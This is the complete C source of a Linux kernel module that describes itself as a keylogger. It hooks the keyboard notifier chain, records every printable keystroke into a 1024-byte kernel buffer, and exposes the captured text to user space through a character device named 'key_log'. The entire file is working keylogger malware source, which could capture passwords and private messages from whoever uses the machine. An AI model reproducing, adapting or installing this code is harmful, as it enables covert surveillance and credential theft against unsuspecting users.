//Kernel notifier keylogger Yonor & ilona

#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/keyboard.h>
#include <linux/fs.h>
#include <linux/cdev.h>
#include <linux/uaccess.h>
#include <linux/notifier.h>

#define DEVICE_NAME "key_log"  // the name of this device

/*global variables*/
int major_num=0;
int minor_num=0;


struct cdev cdev;/*char device structure*/
dev_t dev = 0;

// Keylogger Info
#define BUFFER_LEN 1024
static char keys_buffer[BUFFER_LEN];  // This buffer will contain all the logged keys/..
static char *keys_bf_ptr = keys_buffer; //This buffer holds the characters, it is limit to 1024. Be aware to not Overflow.
int buf_pos = 0;  // Counting characters to avoid overflow

/*parameters of the module-->without permissions*/
module_param(major_num,int,0);
module_param(minor_num,int,0);

// Prototypes
void keylog_exit(void);
static ssize_t dev_read(struct file *, char __user *, size_t, loff_t *); // Device Driver read prototype
static int keys_pressed(struct notifier_block *, unsigned long, void *); // Callback function for the Notification Chain





/*connect our function to the function pointer in fops struct
 *Setting the Device Driver read function
 * */

 //connect our function to it function pointer in fops struct
struct file_operations fops = {
	.owner = THIS_MODULE,
	.read = dev_read
	};


// Initializing the notifier_block
static struct notifier_block nb = {
	.notifier_call = keys_pressed
}; 


static int keys_pressed(struct notifier_block *nb, unsigned long action, void *data) {
	struct keyboard_notifier_param *param = data;
	
	// We are only interested in those notifications that have an event type of KBD_KEYSYM and the user is pressing down the key
	if (action == KBD_KEYSYM && param->down) {
		char c = param->value;
		
		// We will only log those key presses that actually represent an ASCII character. 
		if (c == 0x01) {
			*(keys_bf_ptr++) = 0x0a;
			buf_pos++;
		} else if (c >= 0x20 && c < 0x7f) {
			*(keys_bf_ptr++) = c;
			buf_pos++;
		}
		
		
		
		// Beware of buffer overflows in kernel space!! They can be catastrophic!
		//Prevents the OS to cracked in event of OVERFLOW
		if (buf_pos >= BUFFER_LEN) {
			buf_pos = 0;
			memset(keys_buffer, 0, BUFFER_LEN);
			keys_bf_ptr = keys_buffer;
		}
	}
		return NOTIFY_OK; // We return NOTIFY_OK, as "Notification was processed correctly"
}


// Device driver read function
static ssize_t dev_read(struct file *fp, char __user *buf, size_t length, loff_t *offset) 
{
	
	int len = strlen(keys_buffer);
	int ret = copy_to_user(buf, keys_buffer, len); //Taking data from Kernel with COPY_TO_USER
	if (ret) 
	{
		printk(KERN_INFO "Couldn't copy all data to user space\n");
		return ret;
	}
	memset(keys_buffer, 0, BUFFER_LEN); // Reset buffer after each read this also helps to avoid overflow
	keys_bf_ptr = keys_buffer; // Reset buffer pointer
	return len;
}





	

void my_setup_keydev(void)
{
	int res=0;
	cdev_init(&cdev, &fops);/*initialize cdev & connect to char_fops*/
	cdev.owner = THIS_MODULE;
	res = cdev_add(&cdev,dev,1);
	if(res)
	{
		printk(KERN_NOTICE "Error adding char device res = %d\n" , res);
	}
}


static int __init keylog_init(void)
{
	int err=0;
	err=alloc_chrdev_region(&dev,minor_num,1,THIS_MODULE->name);/*kernel allocate a major num on the fly */
	if(err<0)
	{
		printk(KERN_INFO "iinit_module() : ALLOC FSILURE %d\n" ,major_num );
		keylog_exit();
		return err;
		
	}
	my_setup_keydev();
	major_num=MAJOR(dev);/*obtain the 12 bits for the major number*/
	
	printk(KERN_WARNING "init_module() : the o.s gave us major number = %d\n",major_num);
	printk(KERN_INFO "create node with mknod key_log c %d 0\n",major_num);
	
	
	register_keyboard_notifier(&nb);
	memset(keys_buffer, 0, BUFFER_LEN);
	return 0 ; /*if sucsses rerurn 0*/

	
}


 void keylog_exit(void)
{

	unregister_chrdev_region(major_num,1);
	unregister_keyboard_notifier(&nb);
	printk(KERN_NOTICE "Keylogger unregister\n");
	printk(KERN_NOTICE "Keylogger module unloaded\n");
	
}


module_init(keylog_init);
module_exit(keylog_exit);
MODULE_LICENSE("GPL");
